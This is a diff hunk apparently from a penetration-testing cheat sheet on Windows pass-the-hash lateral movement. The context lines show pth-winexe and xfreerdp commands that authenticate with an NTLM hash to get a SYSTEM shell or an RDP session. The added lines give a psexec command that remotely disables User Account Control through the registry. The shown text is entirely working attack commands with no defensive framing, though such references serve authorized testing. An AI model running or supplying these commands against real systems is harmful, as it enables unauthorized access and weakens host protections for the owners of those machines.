@@ -165,6 +165,9 @@ sc start winexesvc
 ./pth-winexe -U john%'921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42' --system //192.168.210.102 cmd.exe  
 xfreerdp /u:user /d:domain /pth:hash /v:IPAddress
 
+## Disable UAC with Pass-the-hash
+psexec \\dnsname-or-ip reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+
 
 ## WCE64.exe
 /usr/share/wce  
